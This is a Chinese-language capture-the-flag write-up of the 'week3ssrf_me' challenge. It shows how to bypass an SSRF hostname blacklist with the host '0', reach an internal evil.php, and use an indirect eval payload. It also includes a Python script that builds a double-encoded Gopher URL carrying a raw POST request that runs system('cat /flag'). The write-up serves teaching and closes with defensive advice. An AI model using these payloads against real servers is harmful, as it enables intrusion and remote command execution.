# week3ssrf_me

## 题目简述

入口接收 `url` 参数并用 cURL 请求目标地址，但只用正则拦截 `127`、`localhost`、`0.0.0.0` 以及部分协议。内网的 `/evil.php` 只允许本机访问，且其 `c` 参数可以进入 `eval`。利用目标是先绕过主机名检查读取内部源码，再通过 Gopher 构造一份带 POST 正文的原始 HTTP 请求，实现 SSRF 到命令执行。

## 解题过程

过滤器没有覆盖 IPv4 的单整数写法。主机 `0` 会被网络库解析成本机地址，但字符串本身不匹配黑名单，因此：

```text
?url=http://0/evil.php
```

可以访问仅限本机的 `evil.php`。返回源码表明 POST 参数 `c` 会被求值，但直接写常见的带参数函数调用不能通过限制。可将真正的 PHP 代码放在 GET 参数 `test` 中，再令 `c` 使用当前作用域变量表间接取出并二次 `eval`：

```php
eval(end(current(get_defined_vars())));
```

`get_defined_vars()` 取得当前作用域变量，`current(...)` 取到查询参数数组，`end(...)` 再取最后一个查询参数值，最终执行 `test` 中的 `system('cat /flag');`。

外层 SSRF 需要同时控制请求行和 POST 正文，所以使用 Gopher 发送完整 HTTP 报文。下面脚本已处理请求行编码、CRLF、41 字节正文长度和外层 URL 的二次百分号编码：

```python
from urllib.parse import quote, quote_from_bytes

body = b"c=eval(end(current(get_defined_vars())));"
query_code = "system%28%27cat%20%2Fflag%27%29%3B"

request = (
    f"POST /evil.php?test={query_code} HTTP/1.1\r\n"
    "Host: 0\r\n"
    "Connection: close\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    "\r\n"
).encode() + body

selector = quote_from_bytes(request, safe="")
gopher_url = "gopher://0:80/_" + selector
outer_value = quote(gopher_url, safe="")
print("?url=" + outer_value)
```

把输出拼到入口路径后访问，外层页面会回显内部 HTTP 响应，其中包含：

```text
0xGame{SSRF_Me_p1z_549j)g*hdJ}
```

## 方法总结

完整链条是“非标准本机地址绕过 → 读取内网脚本 → Gopher 构造 POST → 间接 `eval` 执行”。SSRF 黑名单只比较 URL 文本，无法可靠判断解析后的目标地址；正确防护应解析并规范化地址，再拒绝所有回环、私网和链路本地网段。构造 Gopher 请求时最常见的错误是遗漏 `\r\n`、正文长度不符，或只编码一次导致 cURL 收到错误的选择器。
